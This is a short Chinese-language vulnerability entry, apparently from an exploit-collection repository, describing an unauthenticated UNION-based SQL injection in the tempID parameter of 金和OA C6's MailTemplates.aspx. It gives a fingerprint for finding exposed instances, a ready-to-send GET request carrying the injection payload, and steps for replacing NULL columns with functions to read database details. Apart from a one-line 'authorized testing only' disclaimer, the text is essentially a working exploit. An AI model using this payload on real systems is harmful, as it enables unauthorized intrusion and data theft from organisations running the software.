---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA MailTemplates.aspx SQL注入漏洞

## 漏洞描述

金和OA C6 `/C6/JHSoft.Web.Mail/MailTemplates.aspx/` 接口 `tempID` 参数存在 SQL 注入漏洞（SQL Server 联合查询注入），未授权即可通过 UNION 直接回显数据库数据。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

```
GET /C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20JtXl HTTP/1.1
```

`tempID` 参数拼接 UNION 查询，列数用 NULL 占位（示例为 3 列），`--` 注释掉后续语句。查询结果回显在页面中，将 NULL 替换为 `user_name()`、`db_name()` 等即可读取数据库信息。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
